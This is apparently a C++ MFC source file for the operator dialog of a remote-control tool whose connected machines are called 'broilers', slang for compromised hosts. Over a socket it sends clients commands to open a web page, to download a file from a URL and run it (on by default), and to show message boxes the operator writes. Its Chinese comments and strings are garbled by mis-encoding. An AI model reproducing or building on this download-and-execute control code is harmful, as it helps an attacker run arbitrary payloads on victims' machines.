// RemoteCmd.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "Client.h"
#include "RemoteCmdDlg.h"
#include "BroilerData.h"

// CRemoteCmd �Ի���
#define TYPE_ICON_NORMAL   _T("��ͨ")
#define TYPE_ICON_QUERY    _T("ѯ��")
#define TYPE_ICON_WARNING  _T("����")
#define TYPE_ICON_ERROR    _T("����")

#define TYPE_BTN_1        _T("ȷ��")
#define TYPE_BTN_2        _T("ȷ����ȡ��")
#define TYPE_BTN_3        _T("�ǡ���")
#define TYPE_BTN_4        _T("�ǡ���ȡ��")
#define TYPE_BTN_5        _T("���ԡ�ȡ��")
#define TYPE_BTN_6        _T("��ֹ�����ԡ�����")


static UINT idArray[] = {ID_RES_REMOTECMD1,     //״̬��
                         ID_RES_REMOTECMD2};


IMPLEMENT_DYNAMIC(CRemoteCmdDlg, CDialog)

CRemoteCmdDlg::CRemoteCmdDlg(CWnd* pParent /*=NULL*/, SOCKET sock)
	: CDialog(CRemoteCmdDlg::IDD, pParent)
{
	m_socket = sock;
	m_hIcon = AfxGetApp()->LoadIcon(IDI_ICON_REMOTE);
}

CRemoteCmdDlg::~CRemoteCmdDlg()
{
}

void CRemoteCmdDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_CHECK_RUN_FILE, m_checkRun);
	DDX_Control(pDX, IDC_COMBO_ICON, m_ComboxIcon);
	DDX_Control(pDX, IDC_COMBO_BUTTON, m_ComboxButton);
}


BEGIN_MESSAGE_MAP(CRemoteCmdDlg, CDialog)
	ON_BN_CLICKED(IDC_BTN_OPEN_WEBSITE, &CRemoteCmdDlg::OnBnClickedBtnOpenWebsite)
	ON_BN_CLICKED(IDC_BTN_DOWN_WEBSITE, &CRemoteCmdDlg::OnBnClickedBtnDownWebsite)
	ON_BN_CLICKED(IDC_BTN_SEND_WND, &CRemoteCmdDlg::OnBnClickedBtnSendWnd)
	ON_BN_CLICKED(IDC_BTN_PREVIEW_WND, &CRemoteCmdDlg::OnBnClickedBtnPreviewWnd)
	ON_WM_CTLCOLOR()
END_MESSAGE_MAP()


// CRemoteCmdDlg ��Ϣ�������
BOOL CRemoteCmdDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: �ڴ����ר�ô����/����û���
	if ( WM_KEYDOWN == pMsg->message)
	{
		int nVirtKey = (int)pMsg->wParam;
		if (VK_RETURN == nVirtKey || VK_ESCAPE == nVirtKey)  //������µ��ǻس�����ESC������ض���Ϣ
		{
			return TRUE;
		}
	}
	return CDialog::PreTranslateMessage(pMsg);
}

BOOL CRemoteCmdDlg::OnInitDialog()
{
	CDialog::OnInitDialog();
    SetIcon(m_hIcon, FALSE);
	// TODO:  �ڴ���Ӷ���ĳ�ʼ��
    DlgInit();
	return TRUE;  // return TRUE unless you set the focus to a control
	// �쳣: OCX ����ҳӦ���� FALSE
}

void CRemoteCmdDlg::DlgInit()
{
	m_checkRun.SetCheck(BST_CHECKED);

	m_ComboxIcon.InsertString(0, TYPE_ICON_NORMAL);
	m_ComboxIcon.InsertString(1, TYPE_ICON_QUERY);
	m_ComboxIcon.InsertString(2, TYPE_ICON_WARNING);
	m_ComboxIcon.InsertString(3, TYPE_ICON_ERROR);
	m_ComboxIcon.SetCurSel(0);  //����Ĭ��ѡ��

	m_ComboxButton.InsertString(0, TYPE_BTN_1);
	m_ComboxButton.InsertString(1, TYPE_BTN_2);
	m_ComboxButton.InsertString(2, TYPE_BTN_3);
	m_ComboxButton.InsertString(3, TYPE_BTN_4);
	m_ComboxButton.InsertString(4, TYPE_BTN_5);
	m_ComboxButton.InsertString(5, TYPE_BTN_6);
	m_ComboxButton.SetCurSel(0);  //����Ĭ��ѡ��

	m_StatusBar.Create(this);   //״̬��
	m_StatusBar.SetIndicators(idArray, sizeof(idArray) / sizeof(UINT));
	m_StatusBar.SetPaneInfo(0, idArray[0], SBPS_NORMAL, 400);
	m_StatusBar.SetPaneInfo(1, idArray[1], SBPS_NORMAL, 200);
	m_StatusBar.SetPaneText(0 , _T("����"));
	m_StatusBar.SetPaneText(1 , _T(""));
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST,AFX_IDW_CONTROLBAR_LAST,0);  //��ʾ��������״̬������仰һ��Ҫ����, ���򹤾�������ʾ��
}

void CRemoteCmdDlg::SendCmdMsg(IN BROADCAST_C tagBroadCast)  //������ҳ��Ϣ
{
	MSGINFO tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO));
	tagMsgInfo.nMsgCmd = CMD_BROADCAST;
	memcpy((char*)tagMsgInfo.context, (char*)&tagBroadCast, sizeof(BROADCAST_C));
	bool bSuccess = true;
	m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);
}

//���ʹ���ҳ����
void CRemoteCmdDlg::OnBnClickedBtnOpenWebsite()
{
	CString strWebSite = _T("");
	GetDlgItemText(IDC_EDIT_OPEN_WEB, strWebSite);
	if (strWebSite.IsEmpty())
	{
		::MessageBox(this->m_hWnd, _T("������ָ������ַ"), _T("��ʾ"), MB_OK | MB_ICONWARNING);
		return ;
	}
	BROADCAST_C tagBroadCast;
	memset(&tagBroadCast, 0, sizeof(BROADCAST_C));
	tagBroadCast.bTag = true;
	tagBroadCast.tagInternet.bDownLoad = false;
	tagBroadCast.tagInternet.bRunExe = false;
	wsprintfW(tagBroadCast.tagInternet.szWebSite, strWebSite);  //·��
	SendCmdMsg(tagBroadCast);

	wchar_t szText[] = _T("���ڴ���ҳ........");
	::SendMessageW(m_StatusBar, SB_SETTEXT, (WPARAM)0, (LPARAM)szText);
}

//����������ҳ�ļ�����
void CRemoteCmdDlg::OnBnClickedBtnDownWebsite()
{
	CString strWebSite = _T("");
	GetDlgItemText(IDC_EDIT_DOWN_WEB, strWebSite);
	if (strWebSite.IsEmpty())
	{
		::MessageBox(this->m_hWnd, _T("������ָ������ַ"), _T("��ʾ"), MB_OK | MB_ICONWARNING);
		return ;
	}
	BROADCAST_C tagBroadCast;
	memset(&tagBroadCast, 0, sizeof(BROADCAST_C));
	tagBroadCast.bTag = true;
	tagBroadCast.tagInternet.bRunExe = (m_checkRun.GetCheck() == 1 ? true : false);
	tagBroadCast.tagInternet.bDownLoad = true;
	wsprintfW(tagBroadCast.tagInternet.szWebSite, strWebSite);
	SendCmdMsg(tagBroadCast);
	
	GetDlgItem(IDC_BTN_DOWN_WEBSITE)->EnableWindow(FALSE);  //���õ����ذ�ť
	GetDlgItem(IDC_BTN_OPEN_WEBSITE)->EnableWindow(FALSE);  //���õ�����ҳ��ť������Ӱ������
	GetDlgItem(IDC_BTN_SEND_WND)->EnableWindow(FALSE);      
	GetDlgItem(IDC_BTN_PREVIEW_WND)->EnableWindow(FALSE);
	wchar_t szText[] = _T("���������ļ�........");
	::SendMessageW(m_StatusBar, SB_SETTEXT, (WPARAM)0, (LPARAM)szText);
}

//���͵�����������
void CRemoteCmdDlg::OnBnClickedBtnSendWnd()
{
	CString strTitle = _T(""); //����
	CString strContent = _T("");  //����
	GetDlgItemText(IDC_EDIT_MSG_TITLE, strTitle);
	GetDlgItemText(IDC_EDIT_MSG_CONTENT, strContent);
	UINT nIconType = GetIconType();
	UINT nBtnType  = GetBtnType();
	BROADCAST_C tagBroadCast;
	memset(&tagBroadCast, 0, sizeof(BROADCAST_C));
	tagBroadCast.bTag = false;
	tagBroadCast.tagWndInfo.nType = (nIconType | nBtnType);
	wsprintfW(tagBroadCast.tagWndInfo.szTitle, strTitle);
	wsprintfW(tagBroadCast.tagWndInfo.szContent, strContent);
	SendCmdMsg(tagBroadCast);

	wchar_t szText[] = _T("����");
	::SendMessageW(m_StatusBar, SB_SETTEXT, (WPARAM)0, (LPARAM)szText);
}

//���ͱ���Ԥ����������
void CRemoteCmdDlg::OnBnClickedBtnPreviewWnd()
{
	CString strTitle = _T(""); //����
	CString strContent = _T("");  //����
	GetDlgItemText(IDC_EDIT_MSG_TITLE, strTitle);
	GetDlgItemText(IDC_EDIT_MSG_CONTENT, strContent);
	UINT nIconType = GetIconType();
	UINT nBtnType  = GetBtnType();
	::MessageBox(this->m_hWnd, strContent, strTitle, nIconType | nBtnType);
}

//��ȡ����ͼ��
UINT CRemoteCmdDlg::GetIconType()
{
	UINT nIconType;
	int nIndex = m_ComboxIcon.GetCurSel();
	CString strIcon = _T("");
	m_ComboxIcon.GetLBText(nIndex, strIcon);

	if (TYPE_ICON_NORMAL == strIcon)  //��ͨ
	{
		nIconType = MB_ICONEXCLAMATION;
	}
	else if (TYPE_ICON_QUERY == strIcon)  //ѯ��
	{
		nIconType = MB_ICONQUESTION;
	}
	else if (TYPE_ICON_WARNING == strIcon)  //����
	{
		nIconType = MB_ICONWARNING;
	}
	else if (TYPE_ICON_ERROR == strIcon)   //����
	{
		nIconType = MB_ICONERROR;
	}
	return nIconType;
}

UINT CRemoteCmdDlg::GetBtnType()
{
	UINT nBtnType;
	int nIndex = m_ComboxButton.GetCurSel();
	CString strButton = _T("");
	m_ComboxButton.GetLBText(nIndex, strButton);

	if (TYPE_BTN_1 == strButton)   //һ��ȷ����ť
	{
		nBtnType = MB_OK;
	}
	else if (TYPE_BTN_2 == strButton)  //һ��ȷ����ť��һ��ȡ����ť
	{
		nBtnType = MB_OKCANCEL ;
	}
	else if (TYPE_BTN_3 == strButton) //�ǡ���
	{
		nBtnType = MB_YESNO;
	}
	else if (TYPE_BTN_4 == strButton) //�ǡ���ȡ��
	{
		nBtnType = MB_YESNOCANCEL;
	}
	else if (TYPE_BTN_5 == strButton) //���ԡ�ȡ��
	{
		nBtnType = MB_RETRYCANCEL ;
	}
	else if (TYPE_BTN_6 == strButton) //��ֹ�����ԡ�����
	{
		nBtnType = MB_ABORTRETRYIGNORE;
	}
	return nBtnType;
}

void CRemoteCmdDlg::UpDateStatusBar(IN const wchar_t* pRetContent)
{
	::SendMessageW(m_StatusBar, SB_SETTEXT, (WPARAM)0, (LPARAM)pRetContent);
	GetDlgItem(IDC_BTN_OPEN_WEBSITE)->EnableWindow(TRUE);
	GetDlgItem(IDC_BTN_DOWN_WEBSITE)->EnableWindow(TRUE);
	GetDlgItem(IDC_BTN_SEND_WND)->EnableWindow(TRUE);      
	GetDlgItem(IDC_BTN_PREVIEW_WND)->EnableWindow(TRUE);
}

HBRUSH CRemoteCmdDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
	HBRUSH hbr = CDialog::OnCtlColor(pDC, pWnd, nCtlColor);

	// TODO:  �ڴ˸��� DC ���κ�����
	if (IDC_STATIC_BROADTIP == pWnd->GetDlgCtrlID() && CTLCOLOR_STATIC == nCtlColor)
	{
		pDC->SetTextColor(RGB(255,0,0));   //������ɫ
		pDC->SetBkMode(TRANSPARENT);
	}
	// TODO:  ���Ĭ�ϵĲ������軭�ʣ��򷵻���һ������
	return hbr;
}

void CRemoteCmdDlg::OnCancel()
{
	// TODO: �ڴ����ר�ô����/����û���
	DestroyWindow();
	delete this;
}

void CRemoteCmdDlg::PostNcDestroy()
{
	// TODO: �ڴ����ר�ô����/����û���
	CDialog::PostNcDestroy();
	((CBroilerData*)this->m_pParentWnd)->m_pRemoteCmdDlg = NULL;
}

